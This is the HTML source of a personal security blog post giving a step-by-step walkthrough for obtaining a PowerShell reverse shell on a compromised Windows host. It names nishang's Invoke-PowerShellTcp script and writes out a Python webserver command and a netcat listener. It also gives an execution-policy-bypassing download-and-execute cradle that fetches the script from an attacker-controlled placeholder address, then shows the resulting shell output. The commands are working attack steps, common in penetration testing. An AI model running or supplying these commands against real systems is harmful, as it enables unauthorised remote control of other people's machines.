<style>
.post {
    margin-top:100px;
    color: black;
		font-size:210%;
}
.name {
    color:black;
		font-size:250%;
}

body {
    background-color:grey;
}

#wrap {
   width:600px;
   margin:200px;
}
#left_col {
	position:relative;
	float:left;
	left:-170px;
	width:300px;
	margin-top:-150px;
}
#right_col {
	position:relative;
  float:right;
	right:-50px;
  width:500px;
	margin-top:-600px;
}
</style>



<body>
<div id="wrap">

  <div id="left_col">

    <h1 class=name href=../index.html> Andr01d </h1>
    <h3> Follow me: </h3>
    <a href="https://github.com/rt-andr01d">
      <img style="width:36px;height:36px" src="../images/github.png">
    </a>
    <br><a href="https://twitter.com/rtandr01d">
      <img style="width:36px;height:36px" src="../images/twitter.png">
    </a></br>
    <a href="https://michaelpoznecki.com">
      <img style="width:36px;height:36px" src="../images/camera.png">
    </a>
    <hr width="1" size="400">

  </div>

  <div id="right_col">
  <p>
    When you ware working in a Windows environment, whether Active Directory is involved or not,
    there will come a time when you need a reverse shell, and most reverse shells from 
    <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a> arent going to work in your situation. 
    Gaining RCE on a Windows box typically means you have access to either cmd or Powershell. Getting a reliable
    shell can give some trouble, but luckily, Powershell has the ability to call and run Powershell 
    scripts remotely without dropping anything on disk.
    First, we need a powershell reverse-tcp script. Luckily, samratashok on <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">github has Invoke-PowerShellTCP.ps1</a>
    For this to work well, we need to add a line to the end of the powershell script. For example:
    <br>
    <br>
    <code>
      Invoke-PowerShellTcp -Reverse -IPAddress X.X.X.X -Port 4444
    </code>
    <br>
    <br>
    where 'X.X.X.X' is the IP address for the reverse shell to connect to.
    In order for our target machine to be able to grab our Powershell script, we need to
    start up a webserver. I am partial to using the easy python webserver, so we start it up
    using:
    <br>
    <br>
    <code>
      python -m SimpleHTTPServer 80
    </code>
    <br>
    <br>
    We will need a listener on our local machine for the reverse shell to connect
    back to, so lets start up a netcat listener:
    <br>
    <br>
    <code>
      netcat -lnvp 4444
    </code>
    <br>
    <br>
    Next, we need to call this powershell script from our RCE on the Windows box.
    To call this script remotely, we need to run this on the Windows machine:
    <br>
    <br>
    <code>
      powershell.exe -exec bypass iex(New-Object Net.WebClient).DownloadString('http://X.X.X.X/InvokePowerShellTcp.ps1')
    </code>
    <br>
    <br>
    If we are lucky, this will now throw a reverse Powershell instance back to our
    netcat listener
    <br>
    <br>
    <code>
      root@kali:~# nc -lnvp 4444<br>
      listening on [any] 4444<br>
      connecting to [X.X.X.X] from (UNKNOWN) [X.X.X.X] 47907<br>
      Windows PowerShell running as user MS01$ on MS01
      Copyright (C) 2015 Microsoft Corporation. All right reserved.<br><br>
      PS C:\
    </code>
    <br>
  </p>

  </div>


</div>
</body>
